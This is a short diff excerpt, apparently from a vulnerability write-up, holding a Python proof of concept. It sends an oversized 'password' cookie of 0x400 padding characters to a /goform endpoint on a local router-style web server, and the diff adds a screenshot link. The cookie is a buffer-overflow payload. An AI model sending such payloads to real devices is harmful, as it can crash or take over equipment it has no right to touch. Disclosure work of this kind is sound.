@@ -16,3 +16,4 @@ URL = "http://192.168.2.3:80/goform/helloworld"
 cookie = {"Cookie":"password="+"a"*0x400+".pngAAA"}
 requests.get(url=URL, cookies=cookie)
 
+![image](https://github.com/user-attachments/assets/c1a89751-2276-4f9b-be2a-1fba6a3be880)
